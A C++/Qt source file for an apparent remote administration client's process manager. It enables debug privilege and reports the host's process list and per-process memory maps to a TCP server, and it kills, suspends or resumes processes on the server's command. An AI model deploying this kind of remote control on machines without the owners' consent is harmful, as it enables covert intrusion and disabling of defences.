#include "processmanager.h"

ProcessManager::ProcessManager(TcpClient *TClient,QObject *parent): AbsManager(TClient)
{
    qDebug()<<"A Process Manager is created.";
    connect(m_client,&TcpClient::connected,this,[=](){
        emit logMessage("[ProcessManager] 客户端已与服务器连接");
        qDebug()<<"[ProcessManager] 客户端已与服务器连接";
        m_client->SendReply(PROCESS_REPLY);
        EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
        Sleep(500);
        SendClientProcessList();
    });
}

ProcessManager::~ProcessManager()
{
    EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

void ProcessManager::HandlePacket(const PACKET &pkt)
{
    qDebug()<<"Process Manager is Handling...";
    auto Token = pkt.isToken;
    quint32 pid;
    QDataStream in(pkt.payload);
    in >> pid;


    switch(Token)
    {
    case PROCESS_REFRESH_RQRUIRE:
        SendClientProcessList();
        break;
    case PROCESS_KILL_REQUIURE:
        KillProcess(pid);
        break;
    case PROCESS_SUSPEND_REQUIRE:
        SuspendProcess(pid);
        break;
    case PROCESS_RESUME_REQUIRE:
        ResumeProcess(pid);
        break;
    case PROCESS_MEMORY_REQUIRE:
        SendProcessMemoryInfo(pid);
        break;
    default:
        qDebug()<<"unknown istoken:"<<pkt.isToken;
        break;
    }
}

void ProcessManager::KillProcess(DWORD pid)
{
    qDebug()<<"[Processmanager] kill"<<pid;
    HANDLE ProcessHandle;
    ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS,false,pid);
    TerminateProcess(ProcessHandle, 0);   //杀死进程
    CloseHandle(ProcessHandle);
    Sleep(100);
    SendClientProcessList();
}

void ProcessManager::SuspendProcess(DWORD pid)
{
    qDebug()<<"[Processmanager] suspend"<<pid;
    HANDLE ThreadID;
    if(GetThreadIdentity(UlongToHandle(pid),&ThreadID) == true)
    {
        HANDLE ThreadHandle = OpenThread(THREAD_ALL_ACCESS,false, HandleToUlong(ThreadID));
        SuspendThread(ThreadHandle);
        CloseHandle(ThreadHandle);
    }
    Sleep(100);
    SendClientProcessList();
}

void ProcessManager::ResumeProcess(DWORD pid)
{
    qDebug()<<"[Processmanager] resume"<<pid;
    HANDLE ThreadID;
    if(GetThreadIdentity(UlongToHandle(pid),&ThreadID) == true)
    {
        HANDLE ThreadHandle = OpenThread(THREAD_ALL_ACCESS,false, HandleToUlong(ThreadID));
        ResumeThread(ThreadHandle);
        CloseHandle(ThreadHandle);
    }
    Sleep(100);
    SendClientProcessList();
}

void ProcessManager::SendProcessMemoryInfo(DWORD pid)
{
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) return;

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    QByteArray payload;
    QDataStream out(&payload, QIODevice::WriteOnly);

    MEMORY_BASIC_INFORMATION mbi;
    quint8* addr = (quint8*)sysInfo.lpMinimumApplicationAddress;

    while ((ULONG_PTR)addr < (ULONG_PTR)sysInfo.lpMaximumApplicationAddress)
    {
        if (!VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi)))
            break;

        // 写入 6 个字段
        out << quint64((quint64)mbi.BaseAddress);
        out << quint64(mbi.RegionSize);
        out << quint32(mbi.State);
        out << quint32(mbi.Protect);
        out << quint32(mbi.AllocationProtect);
        out << quint32(mbi.Type);

        addr += mbi.RegionSize;
    }

    CloseHandle(hProcess);

    PACKET pkt;
    pkt.isToken = PROCESS_MEMORY_REPLY;
    pkt.payload = payload;
    m_client->SendData(pkt);
}

QString ProcessManager::GetProcessPath(HANDLE ProcessHandle)
{
    wchar_t path[MAX_PATH] = {0};
    if(GetModuleFileNameExW(ProcessHandle,NULL,path,MAX_PATH))
    {
        return QString::fromWCharArray(path);
    }
    else
    {
        DWORD len = MAX_PATH;
        if(QueryFullProcessImageNameW(ProcessHandle,0,path,&len))
        {
            return QString::fromWCharArray(path);
        }
        else return "未知路径";
    }

}

bool ProcessManager::EnumProcessData()
{

    m_allProcessData.clear();

    PROCESSENTRY32  ProcessEntry32;
    ProcessEntry32.dwSize = sizeof(ProcessEntry32);

    //得到一个进程快照
    HANDLE SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(SnapshotHandle == INVALID_HANDLE_VALUE) return false;

    if(Process32First(SnapshotHandle,&ProcessEntry32))
    {
        do
        {
            PROCESS_DATA pd;
            pd.ProcessID = ProcessEntry32.th32ProcessID;
            pd.ImageName = QString::fromWCharArray(ProcessEntry32.szExeFile);
            pd.ThreadNum = ProcessEntry32.cntThreads;
            HANDLE ProcessHandle;

            ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                        FALSE, ProcessEntry32.th32ProcessID);
            if(ProcessHandle == NULL)
                ProcessHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                            FALSE, ProcessEntry32.th32ProcessID);

            pd.ProcessPath = GetProcessPath(ProcessHandle);
            pd.ProcessBit = CheckProcessBit(ProcessHandle);

            DWORD HandleCount = 0;
            if(GetProcessHandleCount(ProcessHandle,&HandleCount)) pd.HandleNum = HandleCount;
            else pd.HandleNum = 0;

            ULONG ThreadState,WaitReason;
            if(GetProcessState(UlongToHandle(ProcessEntry32.th32ProcessID),&ThreadState,&WaitReason))
            {
                pd.ThreadStatus = MapThreadState(ThreadState,WaitReason);
                //pd.waitReason = MapWaitReason(WaitReason);
            }
            else pd.ThreadStatus = "未知";

            DWORD SessionId;
            if (ProcessIdToSessionId(ProcessEntry32.th32ProcessID, &SessionId))
                pd.ProcessType = GetProcessType(ProcessEntry32.th32ProcessID,pd.ProcessPath,SessionId);
            else
                pd.ProcessType = "未知";

            m_allProcessData.push_back(pd);

            CloseHandle(ProcessHandle);

        }while(Process32Next(SnapshotHandle, &ProcessEntry32));
    }
    else
    {
        CloseHandle(SnapshotHandle);
        return false;
    }
    CloseHandle(SnapshotHandle);
    return true;
}

bool ProcessManager::GetThreadIdentity(HANDLE ProcessIdentity, HANDLE *ThreadIdentity)
{
    static PFN_NT_QUERY_SYSTEM_INFORMATION NtQuerySystemInformation = nullptr;
    if (!NtQuerySystemInformation) {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        NtQuerySystemInformation = (PFN_NT_QUERY_SYSTEM_INFORMATION)
            GetProcAddress(hNtdll, "NtQuerySystemInformation");
    }

    if (!NtQuerySystemInformation) {
        qWarning() << "[ProcessManager] NtQuerySystemInformation not available";
        return false;
    }

    const ULONG bufferSize = 1024 * 1024; // 1MB 缓冲
    std::unique_ptr<BYTE[]> buffer(new BYTE[bufferSize]);

    NTSTATUS status = NtQuerySystemInformation(
        5 /* SystemProcessInformation */,
        buffer.get(),
        bufferSize,
        nullptr
        );

    if (status < 0) {
        qWarning() << "[ProcessManager] NtQuerySystemInformation failed:" << status;
        return false;
    }

    PMY_SYSTEM_PROCESS_INFORMATION spi =
        reinterpret_cast<PMY_SYSTEM_PROCESS_INFORMATION>(buffer.get());

    while (true) {
        if (spi->UniqueProcessId == ProcessIdentity) {
            if (spi->NumberOfThreads > 0) {
                // 拿第一个线程 ID
                *ThreadIdentity = spi->ThreadInfo[0].ClientId.UniqueThread;
                return true;
            }
            break;
        }

        if (!spi->NextEntryOffset) break;
        spi = (PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)spi + spi->NextEntryOffset);
    }

    return false;
}
bool ProcessManager::GetProcessState(HANDLE ProcessIdentity, ULONG *ThreadState, ULONG *WaitReason)
{
    static PFN_NT_QUERY_SYSTEM_INFORMATION NtQuerySystemInformation = nullptr;
    if (!NtQuerySystemInformation) {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        NtQuerySystemInformation = (PFN_NT_QUERY_SYSTEM_INFORMATION)
            GetProcAddress(hNtdll, "NtQuerySystemInformation");
    }

    if (!NtQuerySystemInformation) {
        qDebug() << "[ProcessManager] NtQuerySystemInformation not available";
        return false;
    }

    // 分配 1MB 缓冲
    const ULONG bufferSize = 1024 * 1024;
    std::unique_ptr<BYTE[]> buffer(new BYTE[bufferSize]);
    NTSTATUS status = NtQuerySystemInformation(5 , buffer.get(), bufferSize, NULL);
    if (status < 0) {
        qDebug() << "[ProcessManager] NtQuerySystemInformation failed:" << status;
        return false;
    }

    PMY_SYSTEM_PROCESS_INFORMATION spi = reinterpret_cast<PMY_SYSTEM_PROCESS_INFORMATION>(buffer.get());

    while (true) {
        if (spi->UniqueProcessId == ProcessIdentity) {
            if (spi->NumberOfThreads > 0) {
                *ThreadState = spi->ThreadInfo[0].ThreadState;   // 只取主线程
                *WaitReason  = spi->ThreadInfo[0].WaitReason;    // 只取主线程
                return true;
            }
            break;
        }

        if (!spi->NextEntryOffset) break;
        spi = (PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)spi + spi->NextEntryOffset);
    }

    return false;
}

QString ProcessManager::CheckProcessBit(HANDLE ProcessHandle)
{
    BOOL isWow64 = FALSE;
    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process =
        (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandleW(L"kernel32"), "IsWow64Process");

    if (fnIsWow64Process && fnIsWow64Process(ProcessHandle, &isWow64)) {
        if (isWow64) return "x86";
        else return "x64";
    }
    return "未知";
}

QString ProcessManager::GetProcessType(DWORD Pid, const QString &path ,DWORD sessionId)
{
    if (sessionId == 0) {
        return "Windows进程";
    }

    // 检查是否有可见窗口
    struct EnumData { DWORD targetPid; bool hasWindow; };
    EnumData data{ Pid, false };

    EnumWindows([](HWND hwnd, LPARAM lParam)->BOOL {
        EnumData* d = reinterpret_cast<EnumData*>(lParam);
        DWORD winPid;
        GetWindowThreadProcessId(hwnd, &winPid);
        if (winPid == d->targetPid && IsWindowVisible(hwnd)) {
            d->hasWindow = true;
            return FALSE;
        }
        return TRUE;
    }, (LPARAM)&data);

    if (data.hasWindow) return "应用";

    return "后台进程";
}

QString ProcessManager::MapThreadState(ULONG Status,ULONG WaitReason)
{
    switch(Status)
    {
    case 0: return "Initialized";
    case 1: return "Ready";
    case 2: return "Waiting";
    case 3: return "Standby";
    case 4: return "Terminated";
    case 5:
        switch(WaitReason) {
        case 0:  return "Executive";
        case 5:  return "Suspended";
        case 7:  return "UserRequest";
        default: return "Running";
        }
    case 6: return "Transition";
    case 7: return "DeferredReady";
    case 8: return "GateWait";
    default: return "Unknown";
    }
}

void ProcessManager::SendClientProcessList()
{
    if(!EnumProcessData())
    {
        qDebug()<<"进程枚举失败，无法发送信息";
        return;
    }

    PACKET pkt;
    pkt.isToken = PROCESS_OPERATION_REPLY;

    QDataStream out(&pkt.payload,QIODevice::WriteOnly);

    for(auto pdata:m_allProcessData)
    {

        out << (quint32) pdata.ProcessID
            << pdata.ImageName
            << pdata.ProcessPath
            << pdata.ProcessType
            << pdata.ThreadStatus
            << (quint32)pdata.HandleNum
            << (quint32)pdata.ThreadNum
            << pdata.ProcessBit;

    }

    m_client -> SendData (pkt);
}
